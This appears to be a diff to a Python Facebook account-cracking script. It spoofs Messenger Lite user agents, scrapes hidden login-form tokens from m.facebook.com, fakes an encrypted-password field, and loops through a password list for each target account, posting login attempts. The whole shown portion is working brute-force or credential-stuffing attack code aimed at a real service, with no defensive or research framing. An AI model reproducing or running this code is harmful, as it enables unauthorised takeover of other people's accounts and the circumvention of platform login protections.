@@ -1243,15 +1243,8 @@ density = random.choice(["{density=2.0,width=720,height=1208}"])
 ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/3;FBMF/huawei;FBBD/huawei;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+str(density)+";]"
 
 
-def extract_field_value(html, field_name):
-    # Function to extract field value using regular expression
-    pattern = rf'name="{field_name}" value="(.*?)"'
-    match = re.search(pattern, html)
-    if match:
-        return match.group(1)
-    else:
-        raise ValueError(f"Field '{field_name}' not found in HTML")
-
+generate_lgnjs = lambda: str(int(time.time()))
+generate_encpass = lambda: '#PWD_BROWSER:5:{}:{}:AZlQACzS6ZmMrcMXKFCxzkIsYsqEajVeqWzts29VIs3NkdQaXDNJkW0UQe2wEOr4RPVT+7d4cfKxgxMydpOty/g9CBPTu47dYzPJjt1ZvWOj5+tu1s5M25wCvIbqLpQwd0k+2A=='.format(int(time.time()), random.randint(1000000000, 9999999999))
 def m5(idf,pwv):
  global loop
  global ok
@@ -1262,37 +1255,29 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get('https://m.facebook.com').text
-   guid = extract_field_value(free_fb, "guid")
-   lgnrnd = extract_field_value(free_fb, "lgnrnd")
-   lgnjs = generate_lgnjs()  # Generate lgnjs dynamically
-   lgndim = extract_field_value(free_fb, "lgndim")
-   lsd = extract_field_value(free_fb, "lsd")
-   jazoest = extract_field_value(free_fb, "jazoest")
-   
-   # Generate encpass dynamically
+   lgnjs = generate_lgnjs()
    encpass = generate_encpass()
-
-   
-   log_data = {
-            'email': idf,
-            'cuid': '',  # Replace with your actual cuid value or generate dynamically
-            'guid': guid,
-            'lgnjs': str(int(time.time())),
-            'lgnrnd': lgnrnd,
-            'locale': 'en_GB',
-            'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/PHP/',
-            'skstamp': '',
-            'timezone': '-330',
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'lsd': lsd,
-            'jazoest': jazoest,
-            'lgndim': lgndim,
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
-            'pass': ps,
-            'login': 'Log In'}
+   free_fb = session.get('https://m.facebook.com').text
+   log_data ={
+        'email': idf, 
+        'cuid': '',
+        'guid': re.search(r'name="guid" value="(.*?)"', free_fb).group(1),
+        'lgnjs': re.search(r'name="lgnjs" value="(.*?)"', free_fb).group(1),
+        'lgnrnd': re.search(r'name="lgnrnd" value="(.*?)"', free_fb).group(1),
+        'locale': 'en_GB',
+        'login_source': 'comet_login_header',
+        'next': 'https://www.facebook.com/PHP/',
+        'skstamp': '',
+        'timezone': '-330',
+        'prefill_contact_point': '',
+        'prefill_source': '',
+        'lsd': re.search(r'name="lsd" value="(.*?)"', free_fb).group(1),
+        'jazoest': re.search(r'name="jazoest" value="(.*?)"', free_fb).group(1),
+        'lgndim': re.search(r'name="lgndim" value="(.*?)"', free_fb).group(1),
+        'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+        'encpass': encpass,
+        'pass': ps,
+        'login': 'Log In'}
    header_freefb = {
     "authority": "m.facebook.com",
     "method": "POST",
